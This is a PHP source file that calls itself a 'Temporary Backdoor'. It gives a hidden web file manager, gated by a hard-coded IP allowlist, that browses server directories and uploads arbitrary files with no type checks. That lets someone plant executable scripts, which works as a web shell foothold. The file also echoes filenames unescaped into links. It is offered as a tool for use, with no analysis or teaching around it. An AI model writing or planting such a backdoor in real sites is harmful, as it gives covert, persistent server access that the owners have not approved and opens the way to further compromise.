<?php
// Temporary Backdoor: Strict Access Controls

// Restrict Access by IP Address (optional, replace YOUR_IP_ADDRESS)
$allowed_ips = ['128.76.169.10']; // Add more IPs as needed
if (!in_array($_SERVER['REMOTE_ADDR'], $allowed_ips)) {
    http_response_code(403);
    die('Access Forbidden');
}

// File system root directory
$directory = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
$directory = realpath($directory);

if (!$directory || strpos($directory, __DIR__) !== 0) {
    die('Access Denied');
}

// Folder creation
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_folder'])) {
    $newFolderName = trim($_POST['new_folder']);
    if (!empty($newFolderName)) {
        $newFolderPath = $directory . DIRECTORY_SEPARATOR . $newFolderName;
        if (!file_exists($newFolderPath)) {
            mkdir($newFolderPath, 0755);
            echo "<p>Folder <strong>" . htmlspecialchars($newFolderName) . "</strong> created successfully.</p>";
        } else {
            echo "<p>Folder already exists.</p>";
        }
    }
}

// File upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
    $uploadedFile = $_FILES['uploaded_file'];
    $uploadPath = $directory . DIRECTORY_SEPARATOR . basename($uploadedFile['name']);
    if (move_uploaded_file($uploadedFile['tmp_name'], $uploadPath)) {
        echo "<p>File <strong>" . htmlspecialchars($uploadedFile['name']) . "</strong> uploaded successfully.</p>";
    } else {
        echo "<p>Failed to upload file.</p>";
    }
}

// File browser
$files = scandir($directory);

echo "<h1>Temporary File Manager</h1>";
echo "<p>Current directory: <strong>" . htmlspecialchars($directory) . "</strong></p>";
echo "<ul>";

foreach ($files as $file) {
    if ($file === '.') continue;
    $filePath = realpath($directory . DIRECTORY_SEPARATOR . $file);

    if ($file === '..') {
        echo "<li><a href='?dir=" . urlencode(dirname($directory)) . "'>.. (Parent Directory)</a></li>";
    } else {
        echo "<li>";
        if (is_dir($filePath)) {
            echo "<a href='?dir=" . urlencode($filePath) . "'>[Folder] $file</a>";
        } else {
            echo "<a href='?file=" . urlencode($filePath) . "' target='_blank'>$file</a>";
        }
        echo "</li>";
    }
}
echo "</ul>";
?>
<h2>Create a New Folder</h2>
<form method="POST">
    <input type="text" name="new_folder" placeholder="Enter folder name" required>
    <button type="submit">Create Folder</button>
</form>

<h2>Upload a File</h2>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="uploaded_file" required>
    <button type="submit">Upload File</button>
</form>

